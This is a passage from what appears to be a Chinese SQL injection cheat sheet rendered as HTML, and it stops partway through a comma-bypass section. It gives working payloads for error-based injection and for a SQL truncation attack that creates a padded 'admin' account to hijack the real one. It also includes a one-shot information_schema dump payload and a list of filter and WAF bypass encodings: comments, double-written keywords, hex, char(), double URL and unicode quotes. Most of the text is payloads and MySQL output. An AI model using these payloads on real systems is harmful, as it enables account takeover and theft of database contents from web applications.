</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>polygon</span><span class=w> </span><span class=p>(()</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=p>())</span><span class=n>a</span><span class=p>)</span><span class=n>b</span><span class=w> </span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=库名>库名</h4><p>上面的方法已经可以爆出库名了，提供另一个方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=mi>1</span><span class=o>-</span><span class=n>a</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1305</span><span class=w> </span><span class=p>(</span><span class=mi>42000</span><span class=p>):</span><span class=w> </span><span class=k>FUNCTION</span><span class=w> </span><span class=n>test</span><span class=p>.</span><span class=n>a</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>exist</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=约束攻击>约束攻击</h3><p>首先 mysql 5.5 版本以上需要设置数据库为宽松模式，避免出现插入错误 error</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>set</span><span class=w> </span><span class=o>@@</span><span class=n>sql_mode</span><span class=o>=</span><span class=n>ANSI</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>首先查看原来的<code>sql_mode</code>，修改一次<code>sql_mode</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=n>sql_mode</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=o>@@</span><span class=n>sql_mode</span><span class=w>                                                                                                                                </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>ONLY_FULL_GROUP_BY</span><span class=p>,</span><span class=n>STRICT_TRANS_TABLES</span><span class=p>,</span><span class=n>NO_ZERO_IN_DATE</span><span class=p>,</span><span class=n>NO_ZERO_DATE</span><span class=p>,</span><span class=n>ERROR_FOR_DIVISION_BY_ZERO</span><span class=p>,</span><span class=n>NO_AUTO_CREATE_USER</span><span class=p>,</span><span class=n>NO_ENGINE_SUBSTITUTION</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=o>@@</span><span class=n>sql_mode</span><span class=o>=</span><span class=n>ANSI</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Query</span><span class=w> </span><span class=n>OK</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=n>affected</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=n>warning</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=n>sql_mode</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=o>@@</span><span class=n>sql_mode</span><span class=w>                                                                     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>REAL_AS_FLOAT</span><span class=p>,</span><span class=n>PIPES_AS_CONCAT</span><span class=p>,</span><span class=n>ANSI_QUOTES</span><span class=p>,</span><span class=n>IGNORE_SPACE</span><span class=p>,</span><span class=n>ONLY_FULL_GROUP_BY</span><span class=p>,</span><span class=n>ANSI</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>在宽松模式下创建数据库，并且先插入<code>admin</code>的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=o>-&gt;</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=nb>varchar</span><span class=p>(</span><span class=mi>25</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=o>-&gt;</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=nb>varchar</span><span class=p>(</span><span class=mi>25</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=o>-&gt;</span><span class=w> </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Query</span><span class=w> </span><span class=n>OK</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=n>affected</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>02</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>users</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;rand_pass&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Query</span><span class=w> </span><span class=n>OK</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=n>affected</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>password</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=n>rand_pass</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>尝试查询包含有空格的<code>admin</code>数据，发现空格被截断，查到<code>admin</code>的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;admin           &#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>password</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=n>rand_pass</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>接着尝试插入<code>admin</code>后面包含有空格的账户，使得前25个字符只包含有<code>admin</code>与空格</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>users</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;admin                       1&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;123456&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Query</span><span class=w> </span><span class=n>OK</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=n>affected</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------------------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w>                  </span><span class=o>|</span><span class=w> </span><span class=n>password</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------------------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>                     </span><span class=o>|</span><span class=w> </span><span class=n>rand_pass</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>                     </span><span class=o>|</span><span class=w> </span><span class=mi>123456</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------------------------+-----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;admin&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;123456&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------------------------+----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w>                  </span><span class=o>|</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------------------------+----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>                     </span><span class=o>|</span><span class=w> </span><span class=mi>123456</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---------------------------+----------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>可以发现我们成功查找到<code>username=admin</code>的账户，后面不需要为 1 ，只要用空格填充前面的字符直到满足 25 个字符</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>users</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;admin                       x&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;hasaki&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=一次性注入出全部结构>一次性注入出全部结构</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=p>(</span><span class=o>@</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=p>(</span><span class=o>@</span><span class=p>:</span><span class=o>=</span><span class=mi>0</span><span class=n>x00</span><span class=p>),(</span><span class=k>SELECT</span><span class=w> </span><span class=p>(</span><span class=o>@</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=p>(</span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=p>)</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=p>(</span><span class=n>table_schema</span><span class=o>&gt;=@</span><span class=p>)</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=p>(</span><span class=o>@</span><span class=p>)</span><span class=k>IN</span><span class=w> </span><span class=p>(</span><span class=o>@</span><span class=p>:</span><span class=o>=</span><span class=n>CONCAT</span><span class=p>(</span><span class=o>@</span><span class=p>,</span><span class=mi>0</span><span class=n>x0a</span><span class=p>,</span><span class=s1>&#39; [ &#39;</span><span class=p>,</span><span class=n>table_schema</span><span class=p>,</span><span class=s1>&#39; ] &gt;&#39;</span><span class=p>,</span><span class=k>table_name</span><span class=p>,</span><span class=s1>&#39; &gt; &#39;</span><span class=p>,</span><span class=k>column_name</span><span class=p>))))</span><span class=n>x</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>如果可以回显，可以用这个 payload 一次性全部注入出表结构</p><h2 id=绕过技巧>绕过技巧</h2><h3 id=空格替代>空格替代</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>%09 %0A %0B %0C %0D %A0 %20 /**/  /*!*/ 
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39;/*!Union*//*!select*/1,2#
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=cm>/*!Union*/</span><span class=k>select</span><span class=cm>/*!1,2*/</span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>username</span><span class=p>()</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=mi>2</span><span class=o>=</span><span class=mi>2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>可以写成</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=p>(</span><span class=n>username</span><span class=p>())</span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=k>and</span><span class=p>(</span><span class=mi>2</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=绕过关键字>绕过关键字</h3><h4 id=双写关键字>双写关键字</h4><p>对于针对替换关键字的绕过，我们可以使用双写关键字来绕过，例如<code>uniunionon</code></p><h4 id=十六进制>十六进制</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>yz</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>b</span><span class=o>=</span><span class=mi>0</span><span class=n>x32</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>yz</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>b</span><span class=o>=</span><span class=nb>char</span><span class=p>(</span><span class=mi>0</span><span class=n>x32</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>yz</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>b</span><span class=o>=</span><span class=nb>char</span><span class=p>(</span><span class=mi>0</span><span class=n>x67</span><span class=p>)</span><span class=o>+</span><span class=nb>char</span><span class=p>(</span><span class=mi>0</span><span class=n>x75</span><span class=p>)</span><span class=o>+</span><span class=nb>char</span><span class=p>(</span><span class=mi>0</span><span class=n>x65</span><span class=p>)</span><span class=o>+</span><span class=nb>char</span><span class=p>(</span><span class=mi>0</span><span class=n>x73</span><span class=p>)</span><span class=o>+</span><span class=nb>char</span><span class=p>(</span><span class=mi>0</span><span class=n>x74</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w>  </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s2>&#34;users&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w>  </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=mi>0</span><span class=n>x7573657273</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>0</span><span class=n>x3C613E61646D696E3C2F613E</span><span class=p>,</span><span class=mi>0</span><span class=n>x2f61</span><span class=p>))</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=ascii>ASCII</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>双重编码绕过
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>一些unicode编码举例：    
</span></span><span class=line><span class=cl>单引号：&#39;
</span></span><span class=line><span class=cl>%u0027 %u02b9 %u02bc
</span></span><span class=line><span class=cl>%u02c8 %u2032
</span></span><span class=line><span class=cl>%uff07 %c0%27
</span></span><span class=line><span class=cl>%c0%a7 %e0%80%a7
</span></span><span class=line><span class=cl>空白：
</span></span><span class=line><span class=cl>%u0020 %uff00
</span></span><span class=line><span class=cl>%c0%20 %c0%a0 %e0%80%a0
</span></span><span class=line><span class=cl>左括号(:
</span></span><span class=line><span class=cl>%u0028 %uff08
</span></span><span class=line><span class=cl>%c0%28 %c0%a8
</span></span><span class=line><span class=cl>%e0%80%a8
</span></span><span class=line><span class=cl>右括号):
</span></span><span class=line><span class=cl>%u0029 %uff09
</span></span><span class=line><span class=cl>%c0%29 %c0%a9
</span></span><span class=line><span class=cl>%e0%80%a9
</span></span></code></pre></td></tr></table></div></div><h4 id=逗号绕过>逗号绕过</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mid</span><span class=p>(</span><span class=k>user</span><span class=p>()</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w>
